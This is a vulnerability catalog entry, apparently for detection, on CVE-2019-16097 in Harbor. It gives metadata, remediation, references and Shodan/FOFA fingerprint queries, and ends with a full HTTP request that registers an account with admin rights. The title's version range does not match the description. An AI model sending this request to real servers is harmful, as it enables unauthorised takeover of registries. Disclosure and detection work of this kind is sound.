---
layout: post
cve_id: CVE-2019-16097
title: Harbor <=1.82.0 - Privilege Escalation
pcap: true
pcap_path: /pcaps/2019/CVE-2019-16097.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-16097.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  escalate their privileges and gain unauthorized access to sensitive information.

  '
remediation: Upgrade to v1.7.6 v1.8.3. v.1.9.0 or higher. A potential workaround without
  applying the fix is to configure Harbor to use a non-DB authentication backend such
  as LDAP.
reference:
- https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/
- https://github.com/goharbor/harbor/issues/8951
- https://nvd.nist.gov/vuln/detail/CVE-2019-16097
- https://github.com/goharbor/harbor/commit/b6db8a8a106259ec9a2c48be8a380cb3b37cf517
- http://www.vmware.com/security/advisories/VMSA-2019-0015.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
  cvss-score: 6.5
  cve-id: CVE-2019-16097
  cwe-id: CWE-862
  epss-score: 0.93503
  epss-percentile: 0.99812
  cpe: cpe:2.3:a:linuxfoundation:harbor:1.7.0:-:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: linuxfoundation
  product: harbor
  shodan-query: http.favicon.hash:657337228
  fofa-query: icon_hash=657337228
tags:
- cve
- cve2019
- intrusive
- harbor
- linuxfoundation
- vuln
---

## ðŸ” Vulnerability Description
Harbor 1.7.0 through 1.8.2 is susceptible to privilege escalation via core/api/user.go, which allows allows non-admin users to create admin accounts via the POST /api/users API when Harbor is setup with DB as an authentication backend and allows user to do self-registration.

## ðŸŒ HTTP Request
```nohighlight
POST /api/users HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
Connection: close
Content-Length: 124
Accept: */*
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip
{"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email": "testpoc@interact.sh", "realname": "poc"}
```

